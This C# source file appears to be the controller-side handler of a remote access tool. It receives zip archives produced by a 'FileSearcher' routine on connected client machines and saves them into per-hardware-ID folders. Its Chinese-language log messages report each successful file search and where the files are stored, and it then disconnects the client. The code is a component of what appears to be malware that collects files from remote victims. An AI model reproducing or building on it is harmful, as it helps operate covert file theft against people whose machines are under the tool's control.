﻿using Server.Connection;
using Server.MessagePack;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Server.Handle_Packet
{
    public class HandlerFileSearcher
    {
        public async void SaveZipFile(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                string fullPath = Path.Combine(Application.StartupPath, "ClientsFolder", unpack_msgpack.ForcePathObject("Hwid").AsString, "FileSearcher");
                if (!Directory.Exists(fullPath))
                    Directory.CreateDirectory(fullPath);
                await Task.Run(() =>
                {
                    byte[] zipFile = unpack_msgpack.ForcePathObject("ZipFile").GetAsBytes();
                    File.WriteAllBytes(fullPath + "//" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".zip", zipFile);
                });
                new HandleLogs().Addmsg($"客户端 {client.Ip} 文件查找成功，文件保存在 @ ClientsFolder/{unpack_msgpack.ForcePathObject("Hwid").AsString}/FileSearcher", Color.Purple);
                client.Disconnected();
            }
            catch (Exception ex)
            {
                new HandleLogs().Addmsg($"文件搜索 {ex.Message}", Color.Red);
            }
        }
    }
}